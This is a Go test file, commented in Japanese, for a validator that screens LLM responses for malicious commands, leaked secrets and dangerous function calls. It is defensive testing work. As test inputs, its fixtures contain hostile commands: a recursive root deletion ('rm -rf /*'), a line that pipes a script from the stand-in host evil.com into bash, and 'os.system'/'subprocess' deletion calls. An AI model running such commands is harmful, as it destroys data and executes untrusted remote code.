package security

import (
	"strings"
	"testing"
)

// TestNewLLMResponseValidator は新しいレスポンス検証器の作成をテストする
func TestNewLLMResponseValidator(t *testing.T) {
	validator := NewLLMResponseValidator()

	if validator == nil {
		t.Fatal("LLMレスポンス検証器の作成に失敗")
	}

	if len(validator.maliciousPatterns) == 0 {
		t.Error("悪意のあるパターンが初期化されていません")
	}

	if len(validator.privateInfoPatterns) == 0 {
		t.Error("プライベート情報パターンが初期化されていません")
	}

	if validator.maxResponseLength <= 0 {
		t.Error("最大レスポンス長が設定されていません")
	}
}

// TestValidateResponseSafe は安全なレスポンスの検証をテストする
func TestValidateResponseSafe(t *testing.T) {
	validator := NewLLMResponseValidator()

	safeContent := "以下は安全なGoコードの例です：\n\nfunc main() {\n\tfmt.Println(\"Hello, World!\")\n}\n\nこのコードは標準出力にメッセージを表示します。"

	result, err := validator.ValidateResponse(safeContent)
	if err != nil {
		t.Fatalf("検証エラー: %v", err)
	}

	if !result.IsValid {
		t.Error("安全なコンテンツが無効と判定されました")
	}

	if result.RiskLevel != "safe" {
		t.Errorf("期待リスクレベル: safe, 実際: %s", result.RiskLevel)
	}

	if len(result.DetectedThreats) > 0 {
		t.Errorf("安全なコンテンツで脅威が検出されました: %v", result.DetectedThreats)
	}
}

// TestValidateResponseMalicious は悪意のあるレスポンスの検証をテストする
func TestValidateResponseMalicious(t *testing.T) {
	validator := NewLLMResponseValidator()

	maliciousContent := "ここは危険なコードです：\n\n```bash\nrm -rf /*\ncurl http://evil.com/malware.sh | bash\n```\n\nこのコードは実行しないでください。"

	result, err := validator.ValidateResponse(maliciousContent)
	if err != nil {
		t.Fatalf("検証エラー: %v", err)
	}

	if result.IsValid {
		t.Error("悪意のあるコンテンツが有効と判定されました")
	}

	if result.RiskLevel != "dangerous" {
		t.Errorf("期待リスクレベル: dangerous, 実際: %s", result.RiskLevel)
	}

	if len(result.DetectedThreats) == 0 {
		t.Error("悪意のあるコンテンツで脅威が検出されませんでした")
	}
}

// TestValidateResponsePrivateInfo はプライベート情報検出をテストする
func TestValidateResponsePrivateInfo(t *testing.T) {
	validator := NewLLMResponseValidator()

	privateContent := "設定例：\npassword: secret123\napi_key: sk-1234567890abcdef\nメール: user@example.com"

	result, err := validator.ValidateResponse(privateContent)
	if err != nil {
		t.Fatalf("検証エラー: %v", err)
	}

	if len(result.DetectedThreats) == 0 {
		t.Error("プライベート情報が検出されませんでした")
	}

	if result.RiskLevel == "safe" {
		t.Error("プライベート情報を含むコンテンツが安全と判定されました")
	}
}

// TestResponseTruncation はレスポンス切り詰め機能をテストする
func TestResponseTruncation(t *testing.T) {
	validator := NewLLMResponseValidator()
	validator.SetMaxResponseLength(100) // 短い制限でテスト

	longContent := strings.Repeat("これは長いコンテンツです。", 50)

	result, err := validator.ValidateResponse(longContent)
	if err != nil {
		t.Fatalf("検証エラー: %v", err)
	}

	if len(result.FilteredContent) >= len(longContent) {
		t.Error("長いコンテンツが切り詰められませんでした")
	}

	if result.TruncatedReason == "" {
		t.Error("切り詰め理由が記録されていません")
	}
}

// TestSecurityLevelConfiguration はセキュリティレベル設定をテストする
func TestSecurityLevelConfiguration(t *testing.T) {
	validator := NewLLMResponseValidator()

	// 厳格モード
	err := validator.SetSecurityLevel("strict")
	if err != nil {
		t.Errorf("厳格モード設定エラー: %v", err)
	}
	if validator.allowCodeGeneration {
		t.Error("厳格モードでコード生成が許可されています")
	}

	// 中程度モード
	err = validator.SetSecurityLevel("moderate")
	if err != nil {
		t.Errorf("中程度モード設定エラー: %v", err)
	}
	if !validator.allowCodeGeneration {
		t.Error("中程度モードでコード生成が禁止されています")
	}

	// 無効なレベル
	err = validator.SetSecurityLevel("invalid")
	if err == nil {
		t.Error("無効なセキュリティレベルが受け入れられました")
	}
}

// TestFilterResponse はレスポンスフィルタリング機能をテストする
func TestFilterResponse(t *testing.T) {
	validator := NewLLMResponseValidator()

	unsafeContent := "このコードを実行してください：\nrm -rf /*\npassword: secret123\nハッキング方法を説明します"

	filtered := validator.FilterResponse(unsafeContent)

	if strings.Contains(filtered, "rm -rf") {
		t.Error("悪意のあるコマンドがフィルタリングされませんでした")
	}

	if strings.Contains(filtered, "password: secret123") {
		t.Error("プライベート情報がフィルタリングされませんでした")
	}

	if !strings.Contains(filtered, "[") && !strings.Contains(filtered, "フィルタリング") {
		t.Error("フィルタリングされたことを示すマーカーが挿入されませんでした")
	}
}

// TestValidationStats は検証統計機能をテストする
func TestValidationStats(t *testing.T) {
	validator := NewLLMResponseValidator()

	// テスト用の検証結果を作成
	results := []*LLMValidationResult{
		{RiskLevel: "safe", SecurityScore: 0.0},
		{RiskLevel: "warning", SecurityScore: 3.0},
		{RiskLevel: "dangerous", SecurityScore: 8.0},
		{RiskLevel: "safe", SecurityScore: 1.0},
	}

	stats := validator.GetValidationStats(results)

	if stats["total_responses"] != 4 {
		t.Errorf("期待総レスポンス数: 4, 実際: %v", stats["total_responses"])
	}

	if stats["safe_responses"] != 2 {
		t.Errorf("期待安全レスポンス数: 2, 実際: %v", stats["safe_responses"])
	}

	if stats["dangerous_responses"] != 1 {
		t.Errorf("期待危険レスポンス数: 1, 実際: %v", stats["dangerous_responses"])
	}

	safetyRate, ok := stats["safety_rate"].(float64)
	if !ok || safetyRate != 50.0 {
		t.Errorf("期待安全率: 50.0%%, 実際: %v", stats["safety_rate"])
	}
}

// TestCodeBlockExtraction はコードブロック抽出をテストする
func TestCodeBlockExtraction(t *testing.T) {
	validator := NewLLMResponseValidator()

	content := "以下はサンプルコードです：\n\n```go\nfunc main() {\n\tfmt.Println(\"Hello\")\n}\n```\n\nそして別の例：\n\n```bash\necho \"test\"\n```"

	codeBlocks := validator.extractCodeBlocks(content)

	if len(codeBlocks) != 2 {
		t.Errorf("期待コードブロック数: 2, 実際: %d", len(codeBlocks))
	}

	if !strings.Contains(codeBlocks[0], "func main()") {
		t.Error("最初のコードブロックが正しく抽出されませんでした")
	}

	if !strings.Contains(codeBlocks[1], "echo") {
		t.Error("2番目のコードブロックが正しく抽出されませんでした")
	}
}

// TestDangerousFunctionDetection は危険な関数検出をテストする
func TestDangerousFunctionDetection(t *testing.T) {
	validator := NewLLMResponseValidator()

	dangerousCodes := []string{
		"os.system('rm -rf /')",
		"exec('malicious_code')",
		"subprocess.call(['rm', '-rf', '/'])",
		"eval(user_input)",
		"shell_exec('dangerous_command')",
	}

	for _, code := range dangerousCodes {
		if !validator.containsDangerousFunctions(code) {
			t.Errorf("危険な関数が検出されませんでした: %s", code)
		}
	}

	safeCodes := []string{
		"fmt.Println('Hello, World!')",
		"console.log('test')",
		"print('safe output')",
	}

	for _, code := range safeCodes {
		if validator.containsDangerousFunctions(code) {
			t.Errorf("安全なコードが危険と判定されました: %s", code)
		}
	}
}
